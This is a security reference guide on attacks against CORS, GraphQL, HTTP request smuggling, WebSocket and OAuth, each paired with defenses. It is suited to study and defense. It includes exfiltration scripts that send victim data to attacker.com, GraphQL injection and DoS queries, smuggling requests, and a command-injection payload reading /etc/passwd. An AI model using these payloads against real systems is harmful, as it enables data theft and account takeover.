# Modern Web Protocol Security

> **Source**: Derived from WooYun Vulnerability Database, OWASP, and industry security practices, covering five major modern web protocol attack surfaces: CORS, GraphQL, HTTP Smuggling, WebSocket, and OAuth.
> **Methodology**: WooYun vulnerability essence formula + L1-L4 systematic analysis

---

## I. CORS Misconfiguration

### 1.1 Vulnerability Essence

```
CORS risk = Overly permissive Access-Control-Allow-Origin configuration x Sensitive endpoints lacking additional authorization
```

The browser same-origin policy is a security barrier; CORS misconfiguration breaks it, allowing malicious sites to read users' sensitive data cross-origin.

### 1.2 Detection Methods

```bash
# Basic detection: send a custom Origin and observe the response
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  -> Dangerous!
# Access-Control-Allow-Credentials: true          -> Cookies can be sent cross-origin
```

**Dangerous Configuration Patterns**

| Pattern | Risk | Description |
|---|---|---|
| `Access-Control-Allow-Origin: *` | High | Wildcard; any domain can read (but cannot send cookies) |
| Dynamic Origin reflection | Critical | Returns the request's Origin directly as a response header |
| `null` Origin allowed | High | `<iframe sandbox>` can construct a null origin |
| Regex matching flaw | High | `evil.com.attacker.com` matches `evil.com` |
| Subdomain wildcard | Medium | `*.target.com` includes subdomains that may be compromised |

### 1.3 Exploitation

```html
<!-- Malicious page: steal user data cross-origin -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null Origin exploitation -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Defense Measures

- **Strict whitelist Origin validation**: Do not reflect dynamically; use an exact match list
- Avoid using `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`
- Do not allow `null` Origin
- Regex matching must be anchored (^ and $) to prevent substring match bypass
- Add extra authorization (e.g., CSRF Token) on sensitive endpoints; do not rely on CORS alone

---

## II. GraphQL Security

### 2.1 Vulnerability Essence

```
GraphQL risk = Powerful query capabilities x Introspection enabled by default x Lack of fine-grained authorization
```

A GraphQL single endpoint exposes the full data model; the introspection mechanism provides complete API documentation, so attackers do not need to guess interfaces.

### 2.2 Introspection Queries - Information Disclosure

```graphql
# Retrieve full schema (types, fields, arguments)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Compact version: retrieve only query types
{__schema{queryType{name,fields{name}}}}

# Retrieve mutation list
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Common Attack Vectors

**Injection Attacks**

```graphql
# Argument concatenation leading to SQL injection
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL injection
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**Batch Query DoS (Nested queries exhaust resources)**

```graphql
# Deep nesting - exponential database queries
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# Alias batch query - enumerate large amounts of data in a single request
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# Batch mutation brute force
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Authentication Bypass**

```graphql
# mutation missing authorization check
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Defense Measures

- **Disable introspection in production**: Detect and reject `__schema`/`__type` requests
- Query depth limit (recommended maximum 10 levels) and complexity analysis
- Rate limiting and query timeouts (prevent batch/nested DoS)
- Field-level permission control (each resolver authorizes independently)
- Parameterize inputs (prevent injection), prohibit string concatenation in query building
- Use Persisted Queries - allow only pre-registered queries to execute

---

## III. HTTP Request Smuggling

### 3.1 Vulnerability Essence

```
Inconsistent parsing of HTTP request boundaries between the frontend proxy (CDN/LB) and backend server
-> "Smuggle" extra requests within a single TCP connection -> Affect request processing of other users
```

Core conflict: When `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) both exist, the frontend and backend choose different headers to parse.

### 3.2 Three Attack Types

| Type | Frontend Parsing | Backend Parsing | Description |
|---|---|---|---|
| CL.TE | Content-Length | Transfer-Encoding | Frontend forwards by CL, backend parses by TE |
| TE.CL | Transfer-Encoding | Content-Length | Frontend forwards by TE, backend parses by CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Obfuscate TE header so one side ignores it |

### 3.3 Classic Payloads

**CL.TE Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE Obfuscation Variants**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detection and Exploitation

```
Detection methods:
1. Send CL/TE conflicting request, observe timeout/response anomalies
2. Smuggle an incomplete request, check if subsequent requests are affected
3. Tool: Burp Suite HTTP Request Smuggler extension

Exploitation scenarios:
- Bypass frontend WAF/ACL -> smuggle malicious request to backend
- Hijack other users' requests -> steal Cookie/Session
- Cache poisoning -> smuggle requests to pollute CDN cache content
- Request routing hijacking -> redirect requests to arbitrary backends
```

### 3.5 Defense Measures

- Frontend and backend use unified HTTP parsing library/version
- Reject requests with both CL and TE headers; reject ambiguous requests
- Disable HTTP/1.0 Keep-Alive backend connection reuse
- Upgrade to HTTP/2 (binary framing protocol; inherently immune to CL/TE ambiguity)
- CDN/LB normalizes request headers before forwarding

---

## IV. WebSocket Security

### 4.1 Vulnerability Essence

```
WebSocket risk = Departing from the traditional security model after HTTP handshake x Persistent bidirectional channel lacks per-message authorization
```

Once a WebSocket connection is established, subsequent messages no longer pass through standard HTTP security mechanisms (Cookie SameSite/CSRF Token, etc.).

### 4.2 Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- Malicious page: hijack the user's WebSocket connection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // Send request as victim
};
ws.onmessage = function(e) {
    // Steal response data
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**Principle**: A WebSocket handshake is a standard HTTP request; the browser automatically includes cookies. If the server does not verify the Origin header, a malicious page can establish an authenticated ws connection.

### 4.3 Message Injection

```javascript
// Send injection payloads via WebSocket
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL injection
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Command injection
```

### 4.4 Insufficient Authentication

| Issue | Risk | Description |
|---|---|---|
| Authentication only at handshake | Connection remains valid after session expires | ws connection can persist for hours |
| No per-message authorization | Any connected client can perform all operations | Missing per-message authorization check |
| Token transmitted in plaintext | WebSocket unencrypted (ws://) | Use wss:// to force encryption |

### 4.5 Defense Measures

- **Verify Origin header**: During handshake, check that Origin is in the whitelist (prevent CSWSH)
- **Token-based auth**: Pass Token via URL parameter or first message during handshake (do not rely on Cookie)
- **Message validation**: Input validation and output encoding on every message (prevent injection)
- Use wss:// to force encrypted transport
- Implement heartbeat mechanism and auto-disconnect on session timeout
- Message rate limiting (prevent DoS)

---

## V. OAuth 2.0/OIDC Security

### 5.1 Vulnerability Essence

```
OAuth risk = Complex multi-party interaction flow x Lax parameter validation x Implementation deviates from spec
```

The OAuth authorization flow involves three-party interaction among client, authorization server, and resource server. Any misconfiguration at any step can lead to token leakage or account takeover.

### 5.2 redirect_uri Manipulation

```
# Normal flow
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# Attack: tamper with redirect_uri to steal authorization code
redirect_uri=https://attacker.com/steal           # Complete replacement
redirect_uri=https://app.com.attacker.com/callback # Subdomain confusion
redirect_uri=https://app.com/callback/../../../attacker # Path traversal
redirect_uri=https://app.com/callback?next=https://attacker.com # Open redirect chain
```

### 5.3 Common Attack Vectors

| Attack Type | Principle | Required Condition |
|---|---|---|
| CSRF attack | state parameter missing or predictable | Bind attacker account to victim |
| Token leak (Referer) | Implicit flow token in URL Fragment | Page contains external resource references |
| Token leak (logs) | Authorization code/token recorded in server logs | Logs accessible |
| PKCE bypass | Public client not using code_challenge | Intercepting auth code is enough to get token |
| IdP confusion (Mix-Up) | Confuse authorization response source in multi-IdP scenario | Client supports multiple OAuth providers |
| Auth code replay | Authorization code not single-use | Intercept auth code and redeem repeatedly |

### 5.4 CSRF and state Parameter

```
# Attack flow (when state is missing)
1. Attacker initiates OAuth authorization, obtains auth code for their own account
2. Constructs link: https://app.com/callback?code=ATTACKER_CODE
3. Tricks victim into clicking -> victim's account binds attacker's third-party account
4. Attacker logs in with third-party account -> takes over victim's account

# Defense: state parameter
state = random unpredictable value (bound to user Session)
-> Verify state matches Session on callback
```

### 5.5 Implicit Flow Risks

```
# Implicit Flow - no longer recommended
https://app.com/callback#access_token=eyJ...&token_type=bearer

Risks:
- Token in URL Fragment; can be leaked via browser history/Referer header
- Cannot use refresh_token; poor user experience
- Cannot bind client identity (no client_secret)

-> Alternative: Authorization Code Flow + PKCE
```

### 5.6 Defense Measures

- **Strict redirect_uri whitelist**: Exact match (no wildcards/subpaths allowed)
- **Enforce state parameter**: Bound to Session, unpredictable, single-use
- **Enforce PKCE**: All clients (especially public clients/SPAs) must use code_challenge
- Use Authorization Code Flow; deprecate Implicit Flow
- Authorization codes are single-use with short validity (recommended under 10 minutes)
- Token binding (DPoP/mTLS) to prevent stolen tokens
- Regularly audit authorized third-party applications and permission scopes

---

*Derived from WooYun Vulnerability Database (88,636 entries) + OWASP/RFC security standards | For security research and defense reference only*
